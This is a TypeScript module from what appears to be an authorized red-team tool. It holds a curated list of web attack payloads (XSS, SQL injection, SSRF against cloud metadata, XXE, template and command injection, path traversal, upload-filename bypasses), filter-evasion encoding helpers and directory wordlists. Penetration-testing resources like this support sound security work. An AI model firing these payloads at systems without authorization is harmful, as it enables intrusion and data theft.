/**
 * Curated payload corpus (RED_TEAM_BUILD_SPEC §6.7).
 *
 * Clean-rebuilt structured corpus inspired by PayloadsAllTheThings (MIT).
 * Not a vendored markdown dump: a small, queryable, typed set per vuln class
 * with transform helpers, consumed by the web capabilities and the existing
 * engines. Attribution: https://github.com/swisskyrepo/PayloadsAllTheThings
 * (MIT licence); no upstream files are copied.
 */

export type VulnClass = "xss" | "sqli" | "ssrf" | "xxe" | "ssti" | "cmdi" | "lfi" | "redirect" | "deser" | "upload";

export interface Payload {
  id: string;
  class: VulnClass;
  template: string;
  tags: string[];
  /** Suggested encodings that often survive input filters. */
  needsEncoding?: string[];
}

export const PAYLOAD_CORPUS: Payload[] = [
  // XSS
  { id: "xss-01", class: "xss", template: "<script>alert(1)</script>", tags: ["basic"] },
  { id: "xss-02", class: "xss", template: "<img src=x onerror=alert(1)>", tags: ["basic", "event"] },
  { id: "xss-03", class: "xss", template: "\"><svg/onload=alert(1)>", tags: ["breakout", "event"] },
  { id: "xss-04", class: "xss", template: "'-alert(1)-'", tags: ["single-quote"] },
  { id: "xss-05", class: "xss", template: "<body onload=alert(1)>", tags: ["event"], needsEncoding: ["html"] },
  { id: "xss-06", class: "xss", template: "javascript:alert(1)", tags: ["url-scheme"] },
  // SQLi
  { id: "sqli-01", class: "sqli", template: "' OR '1'='1", tags: ["auth-bypass", "string"] },
  { id: "sqli-02", class: "sqli", template: "' OR 1=1-- -", tags: ["auth-bypass", "comment"] },
  { id: "sqli-03", class: "sqli", template: "1' ORDER BY 1-- -", tags: ["column-enumeration"] },
  { id: "sqli-04", class: "sqli", template: "1' UNION SELECT NULL,NULL-- -", tags: ["union"] },
  { id: "sqli-05", class: "sqli", template: "1; WAITFOR DELAY '0:0:5'-- -", tags: ["blind", "mssql", "time"] },
  { id: "sqli-06", class: "sqli", template: "1' AND SLEEP(5)-- -", tags: ["blind", "mysql", "time"] },
  { id: "sqli-07", class: "sqli", template: "1' || (SELECT '')-- -", tags: ["postgres", "blind"] },
  // SSRF
  { id: "ssrf-01", class: "ssrf", template: "http://127.0.0.1:80/", tags: ["loopback"] },
  { id: "ssrf-02", class: "ssrf", template: "http://169.254.169.254/latest/meta-data/", tags: ["cloud", "aws"] },
  { id: "ssrf-03", class: "ssrf", template: "file:///etc/hostname", tags: ["file"] },
  { id: "ssrf-04", class: "ssrf", template: "gopher://127.0.0.1:6379/_INFO", tags: ["gopher", "redis"] },
  { id: "ssrf-05", class: "ssrf", template: "dict://127.0.0.1:6379/INFO", tags: ["dict", "redis"] },
  { id: "ssrf-06", class: "ssrf", template: "http://[::1]:80/", tags: ["ipv6", "loopback"] },
  // XXE
  { id: "xxe-01", class: "xxe", template: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>", tags: ["file"] },
  { id: "xxe-02", class: "xxe", template: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><r>&xxe;</r>", tags: ["oob"] },
  { id: "xxe-03", class: "xxe", template: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/hostname\"> %p; ]><r/>", tags: ["parameter-entity"] },
  // SSTI
  { id: "ssti-01", class: "ssti", template: "{{7*7}}", tags: ["jinja2"] },
  { id: "ssti-02", class: "ssti", template: "${7*7}", tags: ["freemarker", "el"] },
  { id: "ssti-03", class: "ssti", template: "<%= 7*7 %>", tags: ["erb"] },
  { id: "ssti-04", class: "ssti", template: "#{7*7}", tags: ["thymeleaf", "spel"] },
  // Command injection
  { id: "cmdi-01", class: "cmdi", template: "; id", tags: ["unix"] },
  { id: "cmdi-02", class: "cmdi", template: "&& ping -n 2 127.0.0.1", tags: ["windows"] },
  { id: "cmdi-03", class: "cmdi", template: "| id", tags: ["unix", "pipe"] },
  { id: "cmdi-04", class: "cmdi", template: "`id`", tags: ["unix", "backtick"] },
  // LFI / path traversal
  { id: "lfi-01", class: "lfi", template: "../../../../etc/hostname", tags: ["unix"] },
  { id: "lfi-02", class: "lfi", template: "..\\..\\..\\..\\windows\\win.ini", tags: ["windows"] },
  { id: "lfi-03", class: "lfi", template: "....//....//....//etc/hostname", tags: ["unix", "filter-bypass"] },
  // Open redirect
  { id: "redirect-01", class: "redirect", template: "https://example.org/", tags: ["absolute"] },
  { id: "redirect-02", class: "redirect", template: "//example.org/", tags: ["protocol-relative"] },
  { id: "redirect-03", class: "redirect", template: "https://example.org@127.0.0.1/", tags: ["userinfo-bypass"] },
  // Deserialization markers (Java)
  { id: "deser-01", class: "deser", template: "rO0ABXQ=", tags: ["java", "base64-header"] },
  { id: "deser-02", class: "deser", template: "\xac\xed\x00\x05", tags: ["java", "magic"] },
  // Upload
  { id: "upload-01", class: "upload", template: "shell.jsp%00.png", tags: ["null-byte"] },
  { id: "upload-02", class: "upload", template: "shell.phtml", tags: ["extension"] },
  { id: "upload-03", class: "upload", template: "shell.jpg.php", tags: ["double-extension"] },
];

/** Payloads of one class, optionally narrowed by tag. */
export function getPayloads(cls: VulnClass, ctx: { tags?: string[] } = {}): Payload[] {
  return PAYLOAD_CORPUS.filter(
    (p) => p.class === cls && (!ctx.tags?.length || p.tags.some((t) => ctx.tags!.includes(t))),
  );
}

export type PayloadTransform = "url" | "html" | "base64" | "double" | "unicode";

/** Apply one transform to a payload template (pure; no engine round-trip). */
export function transformPayload(p: Payload, t: PayloadTransform): string {
  switch (t) {
    case "url":
      return encodeURIComponent(p.template);
    case "html": {
      return p.template.replace(/[<>&"']/g, (c) =>
        c === "<" ? "&lt;" : c === ">" ? "&gt;" : c === "&" ? "&amp;" : c === '"' ? "&quot;" : "&#39;",
      );
    }
    case "base64":
      return Buffer.from(p.template, "utf8").toString("base64");
    case "double":
      return encodeURIComponent(encodeURIComponent(p.template));
    case "unicode":
      return p.template.replace(/./g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`);
  }
}

/** Common wordlists for ffuf-driven discovery (fuzz capability). */
const DIRS_WORDLIST = [
  "admin", "administrator", "api", "assets", "auth", "backup", "bin", "cgi-bin", "config", "console",
  "dashboard", "db", "debug", "dev", "docs", "downloads", "env", "etc", "git", "health", "home",
  "include", "includes", "internal", "js", "lib", "login", "logout", "logs", "old", "phpmyadmin",
  "private", "public", "register", "rest", "secret", "server-status", "setup", "site", "sql", "static",
  "status", "temp", "test", "tmp", "tools", "upload", "uploads", "user", "usr", "var", "vendor", "wp-admin",
  "wp-login.php", ".env", ".git", ".htaccess", ".svn", "CVS", "WEB-INF",
];

const PARAMS_WORDLIST = ["id", "user", "username", "password", "pass", "email", "name", "query", "q", "search",
  "page", "url", "redirect", "next", "return", "file", "path", "doc", "folder", "root", "pg", "style", "cat", "debug"];

const VHOSTS_WORDLIST = ["www", "api", "dev", "staging", "test", "admin", "internal", "mail", "vpn", "portal"];

export function wordlist(name: "dirs" | "params" | "vhosts"): string[] {
  switch (name) {
    case "dirs":
      return [...DIRS_WORDLIST];
    case "params":
      return [...PARAMS_WORDLIST];
    case "vhosts":
      return [...VHOSTS_WORDLIST];
  }
}
